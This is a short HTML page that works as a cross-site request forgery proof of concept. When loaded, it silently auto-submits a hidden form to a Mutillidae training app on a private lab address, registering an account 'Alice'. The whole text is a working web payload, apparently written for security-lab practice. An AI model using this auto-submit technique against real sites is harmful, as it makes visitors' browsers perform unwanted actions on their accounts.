<body onload="document.getElementById('f').submit()">
<form id="f" action="http://192.168.146.128/mutillidae/index.php?page=register.php" method="POST">
<input name="csrf-token" value="" type="hidden"/>
<input title="" htmlandxssandsqlinjectionpoint="1" name="username" size="15" autofocus="1" type="text" value="Alice">
<input title="" sqlinjectionpoint="1" name="password" size="15" type="hidden" value="alice">
<input title="" sqlinjectionpoint="1" name="confirm_password" size="15" type="hidden" value="alice">
<textarea HTMLandXSSandSQLInjectionPoint="1" rows="3" cols="50" name="my_signature"></textarea>
<input name="register-php-submit-button" class="button" value="Create Account" type="hidden" value="Create Account">
</form>
</body>
